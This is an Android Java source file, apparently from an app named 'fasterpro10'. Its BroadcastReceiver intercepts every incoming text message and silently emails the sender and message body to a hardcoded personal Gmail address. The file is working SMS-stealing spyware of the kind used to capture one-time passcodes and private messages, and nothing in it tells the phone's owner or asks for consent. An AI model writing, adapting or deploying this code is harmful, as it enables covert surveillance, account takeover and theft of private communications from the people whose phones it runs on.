package com.example.fasterpro10;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.fasterpro10.JavaMailAPI;

import javax.mail.MessagingException;

public class Receiver extends BroadcastReceiver {

    private static final String TAG = "SMSReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS from: " + sender + ", message: " + messageBody);
                        // Forward the SMS via email
                        try {
                            JavaMailAPI.sendMail("babulahmed000015@gmail.com", "SMS Forwarded", "From: " + sender + "\n" + messageBody);
                        } catch (MessagingException e) {
                            Log.e(TAG, "Failed to send email: " + e.getMessage());
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }
}